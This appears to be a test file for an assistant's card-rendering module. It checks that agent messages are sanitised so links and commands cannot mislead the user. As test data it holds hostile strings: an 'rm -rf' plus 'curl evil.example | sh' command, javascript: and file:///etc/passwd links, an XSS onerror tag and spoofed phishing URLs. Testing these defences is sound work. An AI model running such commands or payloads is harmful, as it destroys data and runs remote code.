import { describe, expect, test } from "bun:test"
import { Effect, Fiber, Option, Schema, Stream, TestClock, TestContext } from "effect"
import type * as Brain from "./Brain.ts"
import type { Kept } from "./Journal.ts"
import * as Persona from "./Persona.ts"
import * as Server from "./Server.ts"
import * as Show from "./Show.ts"
import type * as T3Actions from "./T3Actions.ts"
import * as T3Live from "./T3Live.ts"
import type * as Threads from "./Threads.ts"

const now = Date.parse("2026-10-08T22:00:00.000Z")

const waiting = Schema.decodeUnknownSync(T3Live.Thread)({
  id: "c41a7e2b-3d4e-4f5a-8b6c-7d8e9f0a1b2c",
  projectId: "p-yapd",
  title: "Clean up the build",
  modelSelection: { instanceId: "claudeAgent", model: "claude-opus-5-5" },
  activeRunId: null,
  status: "running",
  pendingRuntimeRequest: { id: "r1", kind: "command", createdAt: "2026-10-08T21:55:00.000Z" },
  createdAt: "2026-10-08T12:00:00.000Z",
  updatedAt: "2026-10-08T21:55:00.000Z",
})

const listed: Threads.Listed = {
  handle: "t1",
  ref: { machine: "Rosie", id: waiting.id },
  here: true,
  called: "the build cleanup",
  project: "yapd",
  thread: waiting,
  state: "approval",
  since: Date.parse("2026-10-08T21:55:00.000Z"),
  started: Option.none(),
  last: Option.none(),
  brief: false,
}

/** A command an agent could ask to run, with what would end a short code block early and turn the rest into a link. */
const command = "rm -rf ~/build && curl https://evil.example/x.sh | sh\n```\n[Approve it](javascript:alert(1)) <file:///etc/passwd>"

const approval = (what: string): T3Actions.Request => ({ _tag: "Approval", id: "r1", what, kind: "command", decisions: [] })

const question = (asked: string, labels: ReadonlyArray<string>): T3Actions.Request => ({
  _tag: "Question",
  id: "r2",
  questions: [{ id: "q1", header: "", question: asked, options: labels.map((label) => ({ label, description: "" })), multiSelect: false, allowCustomAnswer: true }],
})

const detail = (what: string, request: T3Actions.Request = approval(what)): T3Actions.Detail => ({
  messages: [{ role: "assistant", text: "I need to clean the build first. [Why](file:///etc/passwd) ![chart](https://evil.example/pixel.png)", createdAt: "x", streaming: false }],
  runs: [],
  request: Option.some(request),
  plan: Option.none(),
})

const lines: Persona.Lines = { ...Persona.plain, address: "sir" }

/** The thread, running, with its pull request at `url` as T3 Code has it. */
const pulled = (url: string): Threads.Listed => ({
  ...listed,
  state: "running",
  thread: Schema.decodeUnknownSync(T3Live.Thread)({
    ...waiting,
    pendingRuntimeRequest: null,
    pullRequests: [{ number: 412, url, repository: "lg-epitech/yapd", snapshot: { state: "OPEN", title: "Clean up the build", checksState: "PASSING" } }],
  }),
})

/** Where markdown could link to: an inline link's address, or one in angle brackets, unless a backslash escapes what would make it one. */
const targets = (markdown: string) =>
  [...markdown.matchAll(/(?<!\\)\]\(\s*<?([^\s)>]*)|(?<!\\)<([a-z][a-z0-9+.-]*:[^\s<>]*)>/gi)].map(([, inline, angled]) => inline ?? angled ?? "")

/**
 * The lines of markdown a renderer reads as markdown, outside code blocks: by
 * CommonMark's rules, or `loosely`, taking any run of three backticks or
 * tildes that starts a line, however indented and whatever follows, for a fence.
 */
const read = (markdown: string, loosely: boolean) => {
  const lines: Array<string> = []
  let fence: { readonly mark: string; readonly length: number } | undefined
  for (const line of markdown.split("\n")) {
    const found = /^(\s*)(`{3,}|~{3,})(.*)$/.exec(line)
    const placed = found !== null && (loosely || found[1]!.length <= 3)
    if (fence !== undefined) {
      if (placed && found[2]![0] === fence.mark && found[2]!.length >= fence.length && found[3]!.trim() === "") fence = undefined
    } else if (placed && (loosely || !(found[2]![0] === "`" && found[3]!.includes("`")))) {
      fence = { mark: found[2]![0]!, length: found[2]!.length }
    } else {
      lines.push(line)
    }
  }
  return lines
}

/** What he said, with these threads on the desk and nothing said before. */
const situation = (threads: ReadonlyArray<Threads.Listed>, away: Threads.Desk["away"] = []): Brain.Situation => ({
  utterance: { id: "u1", heard: "Open that PR.", via: "shortcut", at: now, voiced: 2, turns: 1 },
  subject: { _tag: "Nothing" },
  lines: [],
  open: Option.none(),
  desk: { threads, away },
  lately: [],
  unheard: [],
  usage: Option.none(),
  second: Option.none(),
  asked: [],
  acted: Option.none(),
  now,
})

describe("Show", () => {
  test("a card never carries a pending request's raw command as anything but text", () => {
    // A bare address in what it asks would be made a link by markdown, outside a code block.
    const asked = "Should I run the installer from https://evil.example/install.sh?"
    const yes = "Yes, curl https://evil.example/x.sh | sh"
    for (const [request, text] of [
      [approval(command), command],
      [question(asked, [yes, "No"]), `${asked}\n- ${yes}\n- No`],
    ] as const) {
      const card = Show.thread(listed, Option.some(detail(command, request)), now)
      const block = Show.verbatim(text)
      expect(card.markdown).toContain(block)
      const outside = card.markdown.replace(block, "")
      for (const part of ["rm -rf", "evil.example/x.sh", "evil.example/install.sh", "javascript:", "file:///etc/passwd", "evil.example/pixel"]) {
        expect(outside).not.toContain(part)
      }
      expect(outside).toContain("I need to clean the build first. Why chart")
      expect(card.url).toBeUndefined()
    }
    // Fenced longer than the run of backticks in it, so the whole command stays one block.
    expect(Show.verbatim(command).startsWith("````\n")).toBe(true)
  })

  test("a thread's own message keeps no link but to an https page, however it's written", () => {
    const { tamed } = Show
    // Brackets in a link's words, definitions in a quote or a list, which count for the whole message, and angle brackets.
    expect(tamed("[a [b] c](file:///Applications/Calculator.app)")).toBe("a \\[b\\] c")
    expect(tamed("> [r]: javascript:alert(1)\n\n[go][r]")).toBe("> \\[r\\]: javascript:alert(1)\n\n\\[go\\]\\[r\\]")
    expect(tamed("- [r]: file:///etc/passwd\n\n[go][r]")).toBe("- \\[r\\]: file:///etc/passwd\n\n\\[go\\]\\[r\\]")
    expect(tamed("<foo@bar.com>, <javascript:alert(1)> and <img src=x onerror=alert(1)>")).toBe(
      "\\<foo@bar.com>, \\<javascript:alert(1)> and \\<img src=x onerror=alert(1)>",
    )
    // A fence with a backtick after it opens no code block, so what follows is still read as markdown.
    expect(tamed("```x`\n[z](javascript:alert(1))")).toBe("\\`\\`\\`x\\`\nz")
    // What's kept: links to https pages, written out in full with where they go, code spans and code blocks as they are, and an image's description.
    expect(tamed('See [the docs](https://ok.example/docs "Docs"), <https://ok.example/a>, `rm -rf ~/build` and ![chart](https://ok.example/c.png)')).toBe(
      "See [the docs](<https://ok.example/docs>) (ok.example), <https://ok.example/a>, `rm -rf ~/build` and chart",
    )
    expect(tamed("[![build](https://ok.example/b.svg)](https://ok.example/run)")).toBe("[build](<https://ok.example/run>) (ok.example)")
    expect(tamed("```js\nconst link = [x](javascript:1)\n```\nThen [y](javascript:2)")).toBe("```\nconst link = [x](javascript:1)\n```\nThen y")
  })

  test("a code block in a thread's message ends where yapd sees it end, for any renderer", () => {
    const lying = "[https://github.com/lg-epitech/integration/pull/412](https://github.com.evil.example/login)"
    const messages = [
      // A fence indented four spaces is a line of the code, which a looser renderer ends the block at.
      `\`\`\`\nbuild ok\n    \`\`\`\n${lying}\n\`\`\``,
      // An indented fence of tildes opens a block that a fence of backticks in it doesn't end, and one of tildes does.
      `  ~~~\n\`\`\`\n~~~\n${lying}\n\`\`\``,
      `   ~~~\n\`\`\`\n~~~\n${lying}\n\`\`\``,
      // A code span a looser renderer takes for a fence.
      `\`\`\` \`x\` \`\`\`\n\`\`\`\n${lying}\n\`\`\``,
    ]
    for (const message of messages) {
      const { markdown } = Show.thread(listed, Option.some({ ...detail("Clean the build"), messages: [{ role: "assistant", text: message, createdAt: "x", streaming: false }] }), now)
      for (const loosely of [false, true]) expect(read(markdown, loosely).join("\n")).not.toContain(lying)
    }
    // Fenced longer than the fence in it.
    expect(Show.tamed(messages[0]!)).toBe(`\`\`\`\`\nbuild ok\n    \`\`\`\n${lying}\n\`\`\`\``)
    expect(Show.tamed(messages[1]!)).toBe(`  \\~\\~\\~\n\`\`\`\n~~~\n${lying}\n\`\`\``)
  })

  test("a code span in a thread's message is kept only when nothing in it could link, since an address just before it can take in its backticks", () => {
    const lying = "[github.com/lg-epitech/integration/pull/412](https://github.com.evil.example/login)"
    // Some renderers make a link of the address, backticks and all, so no code span opens, and what yapd kept as it is in one is read as markdown.
    for (const message of [`See https://ci.example.com/run\`\` ${lying} \`\``, `www.x.com\` ${lying} \``]) {
      const { markdown } = Show.thread(listed, Option.some({ ...detail("Clean the build"), messages: [{ role: "assistant", text: message, createdAt: "x", streaming: false }] }), now)
      expect(targets(markdown)).toEqual([])
    }
    // Text instead, as it was written, and one with nothing in it that could link is still a code span.
    expect(Show.tamed("Run `[x](javascript:1)` then `npm test`, not `a | b` or `<b>`")).toBe("Run \\`\\[x\\](javascript:1)\\` then `npm test`, not \\`a \\| b\\` or \\`\\<b\\>\\`")
  })

  test("a link in a thread's message that names one address can't hide that it opens another", () => {
    const { tamed } = Show
    const pr = "https://github.com/lg-epitech/yapd/pull/7"
    // However the words name it: in full, without a scheme, or in letters that only look like it.
    expect(tamed(`PR is up: [${pr}](https://github.com.evil.example/login)`)).toBe(`PR is up: [${pr}](<https://github.com.evil.example/login>) (github.com.evil.example)`)
    expect(tamed("[github.com/lg-epitech/yapd/pull/7](https://evil.example/pull/7)")).toBe("[github.com/lg-epitech/yapd/pull/7](<https://evil.example/pull/7>) (evil.example)")
    expect(tamed("[https://gіthub.com/pull/7](https://gіthub.com/pull/7)")).toBe("[https://gіthub.com/pull/7](<https://xn--gthub-n2e.com/pull/7>) (xn--gthub-n2e.com)")
    // Words that are the address show where it goes already.
    expect(tamed(`PR is up: [${pr}](${pr}) and [https://ok.example](https://ok.example)`)).toBe(`PR is up: [${pr}](<${pr}>) and [https://ok.example](<https://ok.example/>)`)
  })

  test("nothing a thread, T3 Code or he wrote links anywhere but an https page, on any card", () => {
    const hostile = "[Run it](file:///Applications/Calculator.app) <javascript:alert(1)> ![x](https://evil.example/p.png)"
    const titled: Threads.Listed = { ...listed, thread: Schema.decodeUnknownSync(T3Live.Thread)({ ...waiting, title: "[x](javascript:alert(1)) <file:///etc/passwd>" }) }
    const cards = [
      Show.thread(listed, Option.some({ ...detail("Clean the build"), plan: Option.some(`1. ${hostile}\n2. Read [the notes](https://ok.example/notes)`) }), now),
      Show.overview({ threads: [titled], away: [{ machine: "rig", reason: hostile }] }, now),
      Show.missed(
        [
          { id: 1, at: now, kind: "update", project: "[p](javascript:1)", said: hostile },
          { id: 2, at: now, kind: "notice", text: hostile },
        ],
        now,
      ),
      Show.said(hostile, Option.some("Show me [that](javascript:alert(1)) <file:///etc/passwd>")),
    ]
    for (const { markdown } of cards) expect(targets(markdown).filter((target) => !target.startsWith("https://"))).toEqual([])
    // What's an https link stays one.
    expect(targets(cards[0]!.markdown)).toEqual(["https://ok.example/notes"])
  })

  test("points at the card that's up, and serves a card and a journal entry, as the API documents them", () => {
    const card: Show.Card = {
      id: "c1",
      kind: "pr",
      title: "Migrate Tezos",
      markdown: "**#412** in lg-epitech/integration, open",
      url: "https://github.com/lg-epitech/integration/pull/412",
      caption: "Checks pass, sir.",
      at: now,
    }
    // To the millisecond, which the menu bar app reads it to.
    expect(Show.pointer(Option.some(card))).toStrictEqual({ id: "c1", kind: "pr", title: "Migrate Tezos", at: "2026-10-08T22:00:00.000Z" })
    expect(Show.pointer(Option.none())).toBeNull()
    expect(Show.face(card)).toStrictEqual({ ...card, at: "2026-10-08T22:00:00.000Z" })
    const { url: _url, caption: _caption, ...bare } = card
    expect(Show.face(bare)).toStrictEqual({ ...bare, at: "2026-10-08T22:00:00.000Z" })
    const heard: Kept = { id: 7, at: now, kind: "update", machine: "Rosie", project: "yapd", thread: waiting.id, said: "yapd. The tests pass.", heardAt: now + 9_000 }
    expect(Show.entry(heard)).toStrictEqual({
      id: 7,
      at: "2026-10-08T22:00:00.000Z",
      kind: "update",
      machine: "Rosie",
      project: "yapd",
      thread: waiting.id,
      said: "yapd. The tests pass.",
      heard: "2026-10-08T22:00:09.000Z",
    })
    // Only what's documented, never where it ran on disk or what's kept besides.
    const typed: Kept = { id: 8, at: now, kind: "dictation", text: "Who needs me?", utterance: "u1", directory: "/code/yapd", key: "k", detail: { via: "typed" } }
    expect(Show.entry(typed)).toStrictEqual({ id: 8, at: "2026-10-08T22:00:00.000Z", kind: "dictation", text: "Who needs me?", utterance: "u1" })
  })

  test("the API serves the card that's up, the cards, the threads and the journal, and counts only a stream that asks for cards as watching", async () => {
    await Effect.runPromise(
      Effect.scoped(
        Effect.gen(function* () {
          const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
          const asked: Array<Server.Page> = []
          const kept: Kept = { id: 7, at: now, kind: "update", project: "yapd", said: "yapd. The tests pass.", heardAt: now + 9_000 }
          const desk: Threads.Desk = { threads: [pulled("https://github.com/lg-epitech/yapd/pull/412")], away: [] }
          const server = yield* Server.serve(0, {
            handle: () => Effect.succeed(undefined),
            state: Show.stated(Stream.succeed({ on: true, activity: "idle" as const, updates: [] }), show),
            turn: () => Effect.void,
            replay: () => Effect.succeed("unknown" as const),
            utter: () => Effect.succeed(Option.none()),
            ...Show.served(show, Effect.succeed(desk), (page) =>
              Effect.sync(() => {
                asked.push(page)
                return [kept]
              }),
            ),
          })
          const url = `http://127.0.0.1:${server.port}`
          const json = (path: string, init?: RequestInit) => Effect.promise(() => fetch(`${url}${path}`, init).then((response) => response.json()))
          const before = yield* json("/state")
          const card = yield* show.put({ ...Show.said("Two running.", Option.none()), caption: "Two running, sir." }, { said: "Two running, sir.", turns: 1 })
          const state = (yield* json("/state")) as Server.State
          const served = yield* json(`/cards/${card.id}`)
          const threads = yield* json("/threads")
          const journal = yield* json("/journal?limit=5")
          yield* Effect.promise(() => fetch(`${url}/cards/current`, { method: "DELETE" }))
          const after = yield* json("/state")

          // A status bar module, then the menu bar app, until it quits.
          const following = (path: string) =>
            Effect.gen(function* () {
              const gone = new AbortController()
              const response = yield* Effect.promise(() => fetch(`${url}${path}`, { signal: gone.signal }))
              yield* Effect.promise(() => response.body!.getReader().read())
              return { watched: yield* show.watched, gone: Effect.sync(() => gone.abort()) }
            })
          const plain = yield* following("/state/stream")
          yield* plain.gone
          const app = yield* following("/state/stream?cards")
          yield* app.gone
          let left = yield* show.watched
          for (let tries = 0; tries < 100 && left; tries++) left = yield* Effect.zipRight(Effect.promise(() => Bun.sleep(10)), show.watched)

          expect(before).toEqual({ on: true, activity: "idle", updates: [], showing: null })
          expect(state).toEqual({ on: true, activity: "idle", updates: [], showing: { id: card.id, kind: "said", title: "What I said", at: new Date(card.at).toISOString() } })
          expect(state.showing?.at).toMatch(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d\.\d{3}Z$/)
          expect(served).toEqual({ id: card.id, kind: "said", title: "What I said", markdown: card.markdown, caption: "Two running, sir.", at: new Date(card.at).toISOString() })
          expect(threads).toEqual(Show.listing(desk))
          expect(journal).toEqual([{ id: 7, at: "2026-10-08T22:00:00.000Z", kind: "update", project: "yapd", said: "yapd. The tests pass.", heard: "2026-10-08T22:00:09.000Z" }])
          expect(asked).toEqual([{ most: 5, kinds: [] }])
          expect(after).toMatchObject({ showing: null })
          expect({ plain: plain.watched, app: app.watched, left }).toEqual({ plain: false, app: true, left: false })
        }),
      ),
    )
  })

  test("a card put up while no app watched isn't taken to be on his screen once one does", async () => {
    const result = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
        yield* show.put(Show.said("One running.", Option.none()))
        return yield* Effect.scoped(
          Effect.gen(function* () {
            yield* show.watch
            const before = yield* show.seen
            yield* show.put(Show.said("Two running.", Option.none()))
            return { before, after: Option.map(yield* show.seen, ({ markdown }) => markdown.includes("Two running.")) }
          }),
        )
      }),
    )
    expect(result).toEqual({ before: Option.none(), after: Option.some(true) })
  })

  test("a card that went up with a line before yapd was turned off isn't put back up when the line is said again after", async () => {
    const result = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
        yield* show.put({ kind: "threads", title: "What's going on", markdown: "### Running\n\n- **Clean up the build**" }, { said: "One running.", turns: 1 })
        const again = (turns: number) => {
          const asked = situation([])
          return Effect.map(show.caption("One running.", { ...asked, utterance: { ...asked.utterance, turns } }), Option.map(({ kind }) => kind))
        }
        // Said again before yapd is turned off, then after it's turned off and on.
        return yield* Effect.scoped(Effect.zipRight(show.watch, Effect.all([again(1), again(3)])))
      }),
    )
    expect(result).toEqual([Option.some("threads"), Option.some("said")])
  })

  test("keeps the last twenty cards to fetch again, and puts one back up as it was, on his screen while an app watches", async () => {
    const result = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
        const cards = yield* Effect.forEach(Array.from({ length: 21 }, (_, index) => index), (index) => show.put(Show.said(`Line ${index}.`, Option.none())))
        const [first, second, latest] = [cards[0]!, cards[1]!, cards[20]!]
        return {
          first: yield* show.card(first.id),
          latest: Option.map(yield* show.card(latest.id), ({ markdown }) => markdown === latest.markdown),
          gone: yield* show.back(first.id),
          back: yield* Effect.scoped(Effect.zipRight(show.watch, Effect.zipRight(show.back(second.id), Effect.map(show.seen, Option.map(({ id }) => id === second.id))))),
        }
      }),
    )
    expect(result).toEqual({ first: Option.none(), latest: Option.some(true), gone: false, back: Option.some(true) })
  })

  test("lists the threads on each machine, with their pull requests, and the machines it can't see, as /threads documents", () => {
    const url = "https://github.com/lg-epitech/integration/pull/412"
    const tezos = Schema.decodeUnknownSync(T3Live.Thread)({
      ...waiting,
      id: "850299f8-3b2a-4c1d-8e7f-6a5b4c3d2e1f",
      title: "Migrate the Tezos integration",
      pendingRuntimeRequest: null,
      pullRequests: [{ number: 412, url, repository: "lg-epitech/integration", snapshot: { state: "OPEN", title: "Migrate Tezos", checksState: "PASSING" } }],
    })
    const relay = Schema.decodeUnknownSync(T3Live.Thread)({ ...waiting, id: "r-1", title: "Fix the relay", pendingRuntimeRequest: null })
    // Any agent can link its thread to a pull request at any address, which a UI that makes it a link would follow.
    const linked = (id: string, url: string) =>
      Schema.decodeUnknownSync(T3Live.Thread)({ ...waiting, id, title: "Tidy the docs", pendingRuntimeRequest: null, pullRequests: [{ number: 7, url, repository: "lg-epitech/yapd", snapshot: null }] })
    const unsafe = ["javascript:alert(1)", "file:///Applications/Calculator.app", "vscode://file/etc/passwd", "http://github.com/lg-epitech/yapd/pull/7"].map((url, index) =>
      linked(`d-${index}`, url),
    )
    const machines = Show.listing({
      threads: [
        listed,
        { ...listed, handle: "t2", ref: { machine: "Rosie", id: tezos.id }, project: "integration", thread: tezos, state: "running", since: Date.parse("2026-10-08T21:40:00.000Z") },
        { ...listed, handle: "t3", ref: { machine: "rig", id: relay.id }, here: false, thread: relay, state: "idle", since: Date.parse("2026-10-08T20:00:00.000Z") },
        ...unsafe.map((thread, index): Threads.Listed => ({ ...listed, handle: `t${4 + index}`, ref: { machine: "laptop", id: thread.id }, thread, state: "idle", since: Date.parse("2026-10-08T19:00:00.000Z") })),
      ],
      away: [{ machine: "Alaska", reason: "I can't reach Alaska right now." }],
    })
    expect(machines).toEqual([
      {
        machine: "Rosie",
        threads: [
          { id: waiting.id, project: "yapd", title: "Clean up the build", state: "approval", since: "2026-10-08T21:55:00.000Z" },
          { id: tezos.id, project: "integration", title: "Migrate the Tezos integration", state: "running", since: "2026-10-08T21:40:00.000Z", pr: { number: 412, url, state: "open", checks: "passing" } },
        ],
      },
      { machine: "rig", threads: [{ id: relay.id, project: "yapd", title: "Fix the relay", state: "idle", since: "2026-10-08T20:00:00.000Z" }] },
      {
        machine: "laptop",
        threads: unsafe.map(({ id }) => ({ id, project: "yapd", title: "Tidy the docs", state: "idle", since: "2026-10-08T19:00:00.000Z", pr: { number: 7 } })),
      },
      { machine: "Alaska", reason: "I can't reach Alaska right now.", threads: [] },
    ])
  })

  test("a pull request that doesn't open is said with why, after its verdict", async () => {
    const opening = (url: string, opener: Show.Opener) =>
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), opener)
        const target = pulled(url)
        const { say, card } = yield* show.present("pr", Option.some(target), situation([target]), lines)
        return { say, caption: Option.flatMap(card, ({ caption }) => Option.fromNullable(caption)), link: Option.exists(card, ({ markdown }) => markdown.includes("](")) }
      })
    const result = await Effect.runPromise(
      Effect.all({
        opened: opening("https://github.com/lg-epitech/yapd/pull/412", () => Effect.void),
        failed: opening("https://github.com/lg-epitech/yapd/pull/412", () => Effect.fail("No browser to open it in.")),
        unsafe: opening("http://github.com/lg-epitech/yapd/pull/412", () => Effect.die("Nothing opens here.")),
      }),
    )
    expect(result.opened).toEqual({ say: "The build cleanup: checks pass, sir.", caption: Option.some("The build cleanup: checks pass, sir."), link: true })
    const failed = "The build cleanup: checks pass, sir. I couldn't open it in your browser."
    expect(result.failed).toEqual({ say: failed, caption: Option.some(failed), link: true })
    const unsafe = "The build cleanup: checks pass, sir. Its address isn't a secure web page, so I haven't opened it."
    expect(result.unsafe).toEqual({ say: unsafe, caption: Option.some(unsafe), link: false })
  })

  test("with no thread to be seen, showing one says why rather than that it couldn't tell which", async () => {
    const away = [{ machine: "Rosie", reason: "T3 Code isn't running, so I can't see your threads." }]
    const said = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
        return yield* Effect.forEach(["thread", "pr"], (how) => Effect.map(show.present(how, Option.none(), situation([], away), lines), ({ say, card }) => ({ say, card })))
      }),
    )
    expect(said).toEqual([
      { say: "T3 Code isn't running, so I can't see your threads, sir.", card: Option.none() },
      { say: "T3 Code isn't running, so I can't see your threads, sir.", card: Option.none() },
    ])
  })

  test("a browser or T3 Code that never answers holds up what's said with a card three seconds at most", async () => {
    const result = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.never, () => Effect.never)
        const target = pulled("https://github.com/lg-epitech/yapd/pull/412")
        const pr = yield* Effect.fork(show.present("pr", Option.some(target), situation([target]), lines))
        const thread = yield* Effect.fork(show.present("thread", Option.some(target), situation([target]), lines))
        yield* TestClock.adjust("3 seconds")
        const [opened, read] = [yield* Fiber.join(pr), yield* Fiber.join(thread)]
        return {
          opened: { say: opened.say, kind: Option.map(opened.card, ({ kind }) => kind) },
          read: { say: read.say, card: Option.map(read.card, ({ kind, markdown }) => ({ kind, latest: markdown.includes("### Latest") })) },
        }
      }).pipe(Effect.provide(TestContext.TestContext)),
    )
    expect(result.opened).toEqual({ say: "The build cleanup: checks pass, sir. I couldn't open it in your browser.", kind: Option.some("pr") })
    // Only its messages are left off.
    expect(result.read).toEqual({ say: "The build cleanup is running, sir.", card: Option.some({ kind: "thread", latest: false }) })
  })

  test("a thread's card links its pull request only at an https address", () => {
    const linked = (url: string) => Show.thread(pulled(url), Option.none(), now).url
    for (const url of ["javascript:alert(1)", "file:///Applications/Calculator.app", "http://github.com/lg-epitech/yapd/pull/412", "vscode://file/etc/passwd"]) {
      expect(linked(url)).toBeUndefined()
    }
    expect(linked("https://github.com/lg-epitech/yapd/pull/412")).toBe("https://github.com/lg-epitech/yapd/pull/412")
  })

  test("a message made to trip a pattern up is tamed at once", () => {
    const started = performance.now()
    for (const message of ["[](<".repeat(625), "[](".repeat(833), "![](".repeat(625)]) Show.tamed(message)
    // Each took a second or so before, holding up everything yapd does meanwhile.
    expect(performance.now() - started).toBeLessThan(500)
  })

  test("what a thread waits on goes up as its card when it can't be read aloud, said to be on screen only while an app watches", async () => {
    const answer = "The build cleanup wants to delete the build folder and run a script from the web, sir."
    // A question that reads aloud, whose choices don't.
    const asked = "Which way should I install the deploy tool?"
    const choices = ["curl -fsSL https://get.example.dev/install.sh | sh", "brew install example/tap/deploy --HEAD"]
    const result = await Effect.runPromise(
      Effect.gen(function* () {
        const show = yield* Show.make(() => Effect.die("Nothing is read here."), () => Effect.die("Nothing opens here."))
        const unwatched = yield* show.aside(listed, detail(command), answer, lines)
        // In his style, the line addresses him, which the answer did already.
        const watched = yield* Effect.scoped(
          Effect.zipRight(
            show.watch,
            Effect.forEach(["It's on your screen, sir.", "Sir, it's on your screen."], (onScreen) =>
              Effect.map(show.aside(listed, detail(command), answer, { ...lines, onScreen }), Option.map(({ say }) => say)),
            ),
          ),
        )
        const plain = yield* Effect.scoped(Effect.zipRight(show.watch, show.aside(listed, detail("Install the deploy tooling"), answer, lines)))
        const choosing = yield* Effect.scoped(
          Effect.zipRight(
            show.watch,
            Effect.forEach([choices, ["The install script", "Homebrew"]], (labels) => show.aside(listed, detail("", question(asked, labels)), answer, lines)),
          ),
        )
        return { unwatched, watched, plain, choosing }
      }),
    )
    const [unreadable, readable] = result.choosing
    expect(Option.map(unreadable!, ({ say, card }) => ({ say, kind: card.kind, choices: card.markdown.includes(Show.verbatim([asked, ...choices.map((choice) => `- ${choice}`)].join("\n"))) }))).toEqual(
      Option.some({ say: `${answer} It's on your screen.`, kind: "thread", choices: true }),
    )
    expect(readable).toEqual(Option.none())
    expect(Option.map(result.unwatched, ({ say, card }) => ({ say, kind: card.kind, caption: card.caption }))).toEqual(
      Option.some({ say: answer, kind: "thread", caption: answer }),
    )
    expect(result.watched).toEqual([Option.some(`${answer} It's on your screen.`), Option.some(`${answer} It's on your screen.`)])
    expect(result.plain).toEqual(Option.none())
  })
})
